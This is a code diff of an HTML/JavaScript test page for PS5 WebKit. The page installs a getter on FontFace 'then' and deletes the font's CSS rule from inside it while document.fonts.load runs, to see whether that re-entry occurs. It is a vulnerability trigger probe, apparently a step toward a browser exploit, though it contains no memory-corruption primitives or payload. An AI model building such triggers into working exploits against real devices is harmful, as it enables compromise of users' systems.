@@ -3,71 +3,42 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CSSFontFace re-entry diagnostic</title>
+<title>CSSFontFace load no-check diagnostic</title>
 <style>
-html {
-    font-family: system-ui, -apple-system, sans-serif;
-    background: #101010;
-    color: #eee;
-}
-body {
-    margin: 0;
-    padding: 16px;
-    line-height: 1.45;
-}
-button {
-    font: inherit;
-    padding: 10px 14px;
-    margin: 4px 8px 10px 0;
-}
-.box {
-    border: 1px solid #444;
-    border-radius: 8px;
-    padding: 12px;
-    margin: 12px 0;
-    background: #181818;
-}
-.warn { color: #ffd479; }
-.ok { color: #9cff9c; }
-.bad { color: #ff9c9c; }
-#stage {
-    font-size: 21px;
-    font-weight: 700;
-}
-#probe {
-    position: absolute;
-    left: -10000px;
-    top: -10000px;
-}
+html { font-family: system-ui, -apple-system, sans-serif; background:#111; color:#eee; }
+body { margin:0; padding:16px; line-height:1.45; }
+button { font:inherit; padding:10px 14px; margin:4px 8px 10px 0; }
+.box { border:1px solid #444; border-radius:8px; padding:12px; margin:12px 0; background:#181818; }
+.warn { color:#ffd479; }
+#stage { font-size:21px; font-weight:700; }
+#probe { position:absolute; left:-10000px; top:-10000px; }
 #log, #previous {
-    white-space: pre-wrap;
-    word-break: break-word;
-    background: #050505;
-    color: #d7ffd7;
-    padding: 12px;
-    border-radius: 8px;
-    min-height: 160px;
-    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-    font-size: 13px;
+    white-space:pre-wrap;
+    word-break:break-word;
+    background:#050505;
+    color:#d7ffd7;
+    padding:12px;
+    border-radius:8px;
+    min-height:150px;
+    font-family:ui-monospace, Menlo, Consolas, monospace;
+    font-size:13px;
 }
 </style>
 </head>
 <body>
 
-<h1>CSSFontFace re-entry diagnostic</h1>
+<h1>CSSFontFace load no-check diagnostic</h1>
 
 <div class="box warn">
-Diagnostic-only page. No heap spray, no exploit primitives, no ARW/addrof/fakeobj, no shellcode, no ROP/JOP, no sandbox escape.
-Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter during font loading.
+Validation only. No heap spray, no exploit primitives, no ARW/addrof/fakeobj, no shellcode, no ROP/JOP.
+This version removes document.fonts.check before load.
 </div>
 
 <div class="box">
-    <div id="stage">Stage: not started</div>
-    <button id="run-own-local">Run: own getter + local CSS face</button>
-    <button id="run-proto-local">Run: prototype getter + local CSS face</button>
-    <button id="run-own-missing">Run: own getter + missing CSS face</button>
-    <button id="run-direct">Run: direct jsFace.load diagnostic</button>
-    <button id="run-manual">Run: manual getter sanity check</button>
+    <div id="stage">Stage: ready</div>
+    <button id="run-local">Run local CSS face</button>
+    <button id="run-missing">Run missing CSS face</button>
+    <button id="run-proto">Run prototype getter local</button>
     <button id="clear">Clear logs</button>
     <div id="probe">AB</div>
 </div>
@@ -86,25 +57,32 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
 (function () {
     "use strict";
 
-    const STORAGE_KEY = "cssfontface-reentry-diagnostic-log";
-    const stageElement = document.getElementById("stage");
+    const STORAGE_KEY = "cssfontface-no-check-log";
     const logElement = document.getElementById("log");
     const previousElement = document.getElementById("previous");
+    const stageElement = document.getElementById("stage");
     const probe = document.getElementById("probe");
 
     let seq = 0;
-    let runCounter = 0;
-    let createdFaces = [];
+    let runId = 0;
     let active = null;
+    let createdFaces = [];
 
     function now() {
         return new Date().toISOString();
     }
 
-    function persist(line) {
+    function saveLine(line) {
         try {
-            const old = localStorage.getItem(STORAGE_KEY) || "";
-            localStorage.setItem(STORAGE_KEY, old + line + "\n");
+            let old = localStorage.getItem(STORAGE_KEY) || "";
+            old += line + "\n";
+
+            /* keep persisted log small */
+            const lines = old.split("\n");
+            if (lines.length > 120)
+                old = lines.slice(lines.length - 120).join("\n");
+
+            localStorage.setItem(STORAGE_KEY, old);
         } catch (e) {
         }
     }
@@ -112,7 +90,7 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
     function log(msg) {
         const line = "[" + (++seq) + "] " + now() + " :: " + msg;
         logElement.textContent += line + "\n";
-        persist(line);
+        saveLine(line);
         try { console.log(line); } catch (e) {}
     }
 
@@ -121,27 +99,24 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
         log("STAGE => " + msg);
     }
 
+    function clearLogs() {
+        try { localStorage.removeItem(STORAGE_KEY); } catch (e) {}
+        seq = 0;
+        logElement.textContent = "";
+        previousElement.textContent = "";
+        stage("logs cleared");
+    }
+
     function loadPrevious() {
         try {
             previousElement.textContent = localStorage.getItem(STORAGE_KEY) || "";
         } catch (e) {
-            previousElement.textContent = "localStorage unavailable: " + e;
+            previousElement.textContent = "localStorage unavailable";
         }
     }
 
-    function clearLogs() {
-        try {
-            localStorage.removeItem(STORAGE_KEY);
-        } catch (e) {
-        }
-        logElement.textContent = "";
-        previousElement.textContent = "";
-        seq = 0;
-        stage("logs cleared");
-    }
-
-    window.onerror = function (message, source, lineno, colno, error) {
-        log("window.onerror: " + message + " at " + lineno + ":" + colno);
+    window.onerror = function (message, source, line, col, error) {
+        log("window.onerror: " + message + " at " + line + ":" + col);
         if (error && error.stack)
             log("stack: " + error.stack);
     };
@@ -151,31 +126,21 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
     };
 
     window.addEventListener("beforeunload", function () {
-        log("beforeunload fired");
+        log("beforeunload");
     });
 
-    function removeOldStyles() {
-        const old = document.querySelectorAll("style[data-validation-style='1']");
-        for (const node of old)
-            node.remove();
-    }
+    function cleanup() {
+        const oldStyles = document.querySelectorAll("style[data-cssfontface-test='1']");
+        for (const s of oldStyles)
+            s.remove();
 
-    function cleanupFaces() {
-        if (!document.fonts)
-            return;
-        for (const face of createdFaces) {
-            try {
-                document.fonts.delete(face);
-            } catch (e) {
-                log("document.fonts.delete threw: " + e);
+        if (document.fonts) {
+            for (const face of createdFaces) {
+                try { document.fonts.delete(face); } catch (e) {}
             }
         }
-        createdFaces = [];
-    }
 
-    function cleanup() {
-        removeOldStyles();
-        cleanupFaces();
+        createdFaces = [];
         probe.style.fontFamily = "";
         probe.textContent = "AB";
         active = null;
@@ -191,79 +156,75 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
         }
     }
 
-    function makeStyle(family, cssVariant) {
+    function createStyle(family, variant) {
         const style = document.createElement("style");
-        style.setAttribute("data-validation-style", "1");
+        style.setAttribute("data-cssfontface-test", "1");
 
         let src;
-        if (cssVariant === "missing")
-            src = 'url("missing-font-' + runCounter + '.woff") format("woff")';
-        else
+        if (variant === "missing") {
+            src = 'url("missing-font-' + Date.now() + '.woff") format("woff")';
+        } else {
             src = 'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")';
+        }
 
         style.textContent =
             '@font-face {\n' +
-            '    font-family: "' + family + '";\n' +
-            '    src: ' + src + ';\n' +
-            '    unicode-range: U+0042;\n' +
+            '  font-family: "' + family + '";\n' +
+            '  src: ' + src + ';\n' +
+            '  unicode-range: U+0042;\n' +
             '}\n';
 
         document.head.appendChild(style);
         return style;
     }
 
-    function forceStyleRecalc(label) {
+    function forceRecalc(label) {
         try {
             const a = document.body.offsetTop;
             const b = probe.offsetWidth;
             const c = getComputedStyle(probe).fontFamily;
-            log(label + ": forced style/layout recalc ok; offsetTop=" + a + ", probeWidth=" + b + ", fontFamily=" + c);
+            log(label + ": recalc ok; offsetTop=" + a + ", probeWidth=" + b + ", fontFamily=" + c);
         } catch (e) {
-            log(label + ": forceStyleRecalc threw: " + e);
+            log(label + ": recalc threw " + e.name + ": " + e.message);
         }
     }
 
-    function mutateFromThenGetter(label) {
+    function mutateFromGetter(label) {
         if (!active)
             return;
 
         active.reentered = true;
         active.reentryCount++;
 
-        stage("RE-ENTRY FIRED from " + label);
+        stage("RE-ENTRY FIRED");
         log("THEN GETTER FIRED from " + label);
-        log("before mutation: cssRules=" + cssRuleCount(active.styleElement));
+        log("before deleteRule: cssRules=" + cssRuleCount(active.styleElement));
 
         try {
             const sheet = active.styleElement.sheet;
-            if (sheet && sheet.cssRules && sheet.cssRules.length > 0) {
+            const before = sheet.cssRules.length;
+
+            if (before > 0) {
                 sheet.deleteRule(0);
                 log("deleteRule(0) executed");
             } else {
-                log("deleteRule skipped: no cssRules");
+                log("deleteRule skipped: cssRules=0");
             }
         } catch (e) {
             log("deleteRule threw: " + e.name + ": " + e.message);
         }
 
         log("after deleteRule: cssRules=" + cssRuleCount(active.styleElement));
-        forceStyleRecalc("inside then getter");
-
-        try {
-            const checkA = document.fonts.check('16px "' + active.family + '"', "A");
-            const checkB = document.fonts.check('16px "' + active.family + '"', "B");
-            const checkAB = document.fonts.check('16px "' + active.family + '"', "AB");
-            log("document.fonts.check after mutation: A=" + checkA + ", B=" + checkB + ", AB=" + checkAB);
-        } catch (e) {
-            log("document.fonts.check after mutation threw: " + e);
-        }
+        forceRecalc("inside then getter");
     }
 
-    function makeThenGetter(label) {
+    function makeGetter(label) {
         return function () {
             log("then getter property read: " + label + ", armed=" + !!(active && active.armed));
+
             if (active && active.armed)
-                mutateFromThenGetter(label);
+                mutateFromGetter(label);
+
             return undefined;
         };
     }
@@ -271,6 +232,7 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
     function withTimeout(promise, ms) {
         return new Promise(function (resolve) {
             let done = false;
+
             const timer = setTimeout(function () {
                 if (done)
                     return;
@@ -300,28 +262,30 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
             'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")',
             { unicodeRange: "U+0041" }
         );
+
         createdFaces.push(face);
         return face;
     }
 
-    async function runDocumentFontsLoad(getterMode, cssVariant) {
+    async function runTest(mode, variant) {
         cleanup();
-        runCounter++;
+        runId++;
 
         if (!window.FontFace) {
-            stage("FontFace API missing");
-            log("FontFace API is not available");
+            stage("FontFace missing");
+            log("FontFace API missing");
             return;
         }
 
         if (!document.fonts) {
             stage("document.fonts missing");
-            log("document.fonts is not available");
+            log("document.fonts missing");
             return;
         }
 
-        const family = "ps5-reentry-" + getterMode + "-" + cssVariant + "-" + Date.now() + "-" + runCounter;
-        const styleElement = makeStyle(family, cssVariant);
+        const family = "ps5-nocheck-" + mode + "-" + variant + "-" + Date.now() + "-" + runId;
+        const styleElement = createStyle(family, variant);
+
         probe.style.fontFamily = '"' + family + '"';
         probe.textContent = "AB";
 
@@ -333,20 +297,20 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
             reentryCount: 0
         };
 
-        stage("setup " + getterMode + " + " + cssVariant);
-        log("family=" + family);
-        log("initial cssRules=" + cssRuleCount(styleElement));
-        log("initial document.fonts.size=" + document.fonts.size);
-
         let oldProtoDesc = null;
         let protoChanged = false;
 
         try {
-            if (getterMode === "prototype") {
+            stage("setup " + mode + " + " + variant);
+            log("family=" + family);
+            log("initial cssRules=" + cssRuleCount(styleElement));
+            log("initial document.fonts.size=" + document.fonts.size);
+
+            if (mode === "prototype") {
                 oldProtoDesc = Object.getOwnPropertyDescriptor(FontFace.prototype, "then");
                 Object.defineProperty(FontFace.prototype, "then", {
                     configurable: true,
-                    get: makeThenGetter("FontFace.prototype.then")
+                    get: makeGetter("FontFace.prototype.then")
                 });
                 protoChanged = true;
                 log("installed getter on FontFace.prototype.then");
@@ -355,62 +319,54 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
             const jsFace = createJSFace(family);
             log("created JS FontFace; status=" + jsFace.status);
 
-            if (getterMode === "own") {
+            if (mode === "own") {
                 Object.defineProperty(jsFace, "then", {
                     configurable: true,
-                    get: makeThenGetter("jsFace.then")
+                    get: makeGetter("jsFace.then")
                 });
                 log("installed own getter on jsFace.then");
             }
 
-            log('"then" in jsFace = ' + ("then" in jsFace));
-            log("own then descriptor exists = " + !!Object.getOwnPropertyDescriptor(jsFace, "then"));
-            log("prototype then descriptor exists = " + !!Object.getOwnPropertyDescriptor(FontFace.prototype, "then"));
+            log('"then" in jsFace=' + ("then" in jsFace));
+            log("own then descriptor=" + !!Object.getOwnPropertyDescriptor(jsFace, "then"));
+            log("prototype then descriptor=" + !!Object.getOwnPropertyDescriptor(FontFace.prototype, "then"));
 
             /*
-             * Important:
-             * Access jsFace.loaded before document.fonts.load().
-             * Some WebKit paths only resolve the loaded promise if it was created.
-             */
+              Important:
+              Create jsFace.loaded before document.fonts.load.
+              This is what made direct jsFace.load read the then getter on your PS5.
+            */
             const loadedPromise = jsFace.loaded;
-            log("accessed jsFace.loaded before document.fonts.load; face.status=" + jsFace.status);
+            log("accessed jsFace.loaded; status=" + jsFace.status);
 
             loadedPromise.then(function (value) {
-                log("jsFace.loaded resolved callback; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status);
+                log("jsFace.loaded resolved; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status);
             }, function (error) {
-                log("jsFace.loaded rejected callback: " + error + ", status=" + jsFace.status);
+                log("jsFace.loaded rejected: " + error + ", status=" + jsFace.status);
             });
 
             document.fonts.add(jsFace);
-            log("added JS face to document.fonts; size=" + document.fonts.size + ", status=" + jsFace.status);
+            log("added JS face; document.fonts.size=" + document.fonts.size);
 
-            try {
-                log("document.fonts.check before load A=" + document.fonts.check('16px "' + family + '"', "A"));
-                log("document.fonts.check before load B=" + document.fonts.check('16px "' + family + '"', "B"));
-                log("document.fonts.check before load AB=" + document.fonts.check('16px "' + family + '"', "AB"));
-            } catch (e) {
-                log("document.fonts.check before load threw: " + e);
-            }
-
-            forceStyleRecalc("before document.fonts.load");
+            forceRecalc("before document.fonts.load");
 
             active.armed = true;
             stage("calling document.fonts.load");
 
-            const loadPromise = document.fonts.load('16px "' + family + '"', "AB");
+            const p = document.fonts.load('16px "' + family + '"', "AB");
             log("document.fonts.load returned Promise");
 
-            const result = await withTimeout(loadPromise, 5000);
+            const result = await withTimeout(p, 7000);
 
             active.armed = false;
 
             if (result.type === "resolved") {
                 const faces = result.value;
                 log("document.fonts.load resolved; faces.length=" + (faces && faces.length));
+
                 if (faces && faces.length) {
-                    for (let i = 0; i < faces.length; i++) {
+                    for (let i = 0; i < faces.length; i++)
                         log("returned face[" + i + "].status=" + faces[i].status + ", sameAsJSFace=" + (faces[i] === jsFace));
-                    }
                 }
             } else if (result.type === "rejected") {
                 log("document.fonts.load rejected: " + result.error);
@@ -418,19 +374,19 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
                 log("document.fonts.load timed out");
             }
 
-            forceStyleRecalc("after document.fonts.load");
+            forceRecalc("after document.fonts.load");
 
-            log("final jsFace.status=" + jsFace.status);
             log("final cssRules=" + cssRuleCount(styleElement));
             log("final document.fonts.size=" + document.fonts.size);
             log("final reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
 
             if (active.reentered && cssRuleCount(styleElement) === 0)
-                stage("RE-ENTRY reached and CSS rule deleted");
+                stage("RE-ENTRY + deleteRule reached");
             else if (active.reentered)
-                stage("RE-ENTRY reached but CSS rule not deleted");
+                stage("RE-ENTRY reached, deleteRule not confirmed");
             else
-                stage("NO RE-ENTRY observed");
+                stage("NO RE-ENTRY");
+
         } catch (e) {
             active.armed = false;
             stage("exception");
@@ -446,150 +402,25 @@ Goal: check whether PS5 WebKit invokes a FontFace <code>then</code> getter durin
                         Object.defineProperty(FontFace.prototype, "then", oldProtoDesc);
                     else
                         delete FontFace.prototype.then;
+
                     log("restored FontFace.prototype.then");
                 } catch (e) {
-                    log("failed to restore FontFace.prototype.then: " + e);
+                    log("restore prototype threw: " + e.name + ": " + e.message);
                 }
             }
         }
     }
 
-    async function runDirectJSFaceLoad() {
-        cleanup();
-        runCounter++;
-
-        if (!window.FontFace) {
-            stage("FontFace API missing");
-            return;
-        }
-
-        const family = "ps5-direct-jsface-" + Date.now() + "-" + runCounter;
-
-        active = {
-            family: family,
-            styleElement: null,
-            armed: false,
-            reentered: false,
-            reentryCount: 0
-        };
-
-        stage("direct jsFace.load diagnostic");
-
-        try {
-            const jsFace = createJSFace(family);
-
-            Object.defineProperty(jsFace, "then", {
-                configurable: true,
-                get: makeThenGetter("direct jsFace.then")
-            });
-
-            log("created JS FontFace; status=" + jsFace.status);
-            log("installed own getter on jsFace.then");
-
-            const loadedPromise = jsFace.loaded;
-            log("accessed jsFace.loaded before jsFace.load()");
-
-            loadedPromise.then(function (value) {
-                log("jsFace.loaded resolved callback; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status);
-            }, function (error) {
-                log("jsFace.loaded rejected callback: " + error + ", status=" + jsFace.status);
-            });
-
-            active.armed = true;
-            stage("calling jsFace.load");
-
-            const p = jsFace.load();
-            log("jsFace.load returned Promise");
-
-            const result = await withTimeout(p, 5000);
-            active.armed = false;
-
-            if (result.type === "resolved")
-                log("jsFace.load resolved; valueIsFace=" + (result.value === jsFace) + ", status=" + jsFace.status);
-            else if (result.type === "rejected")
-                log("jsFace.load rejected: " + result.error + ", status=" + jsFace.status);
-            else
-                log("jsFace.load timed out; status=" + jsFace.status);
-
-            log("final reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
-
-            if (active.reentered)
-                stage("direct jsFace.load caused then getter read");
-            else
-                stage("direct jsFace.load did NOT read then getter");
-        } catch (e) {
-            active.armed = false;
-            stage("direct test exception");
-            log("exception: " + e.name + ": " + e.message);
-        }
-    }
-
-    function runManualGetterSanity() {
-        cleanup();
-        runCounter++;
-
-        if (!window.FontFace) {
-            stage("FontFace API missing");
-            return;
-        }
-
-        const family = "ps5-manual-" + Date.now() + "-" + runCounter;
-
-        active = {
-            family: family,
-            styleElement: null,
-            armed: true,
-            reentered: false,
-            reentryCount: 0
-        };
-
-        stage("manual getter sanity check");
-
-        try {
-            const jsFace = createJSFace(family);
-
-            Object.defineProperty(jsFace, "then", {
-                configurable: true,
-                get: makeThenGetter("manual jsFace.then")
-            });
-
-            log("installed own getter on jsFace.then");
-            log("about to read jsFace.then manually");
-
-            const value = jsFace.then;
-            log("manual read returned: " + value);
-            log("final reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
-
-            if (active.reentered)
-                stage("manual getter works");
-            else
-                stage("manual getter did NOT work");
-        } catch (e) {
-            stage("manual test exception");
-            log("exception: " + e.name + ": " + e.message);
-        } finally {
-            active.armed = false;
-        }
-    }
-
-    document.getElementById("run-own-local").onclick = function () {
-        runDocumentFontsLoad("own", "local");
+    document.getElementById("run-local").onclick = function () {
+        runTest("own", "local");
     };
 
-    document.getElementById("run-proto-local").onclick = function () {
-        runDocumentFontsLoad("prototype", "local");
+    document.getElementById("run-missing").onclick = function () {
+        runTest("own", "missing");
     };
 
-    document.getElementById("run-own-missing").onclick = function () {
-        runDocumentFontsLoad("own", "missing");
-    };
-
-    document.getElementById("run-direct").onclick = function () {
-        runDirectJSFaceLoad();
-    };
-
-    document.getElementById("run-manual").onclick = function () {
-        runManualGetterSanity();
+    document.getElementById("run-proto").onclick = function () {
+        runTest("prototype", "local");
     };
 
     document.getElementById("clear").onclick = clearLogs;
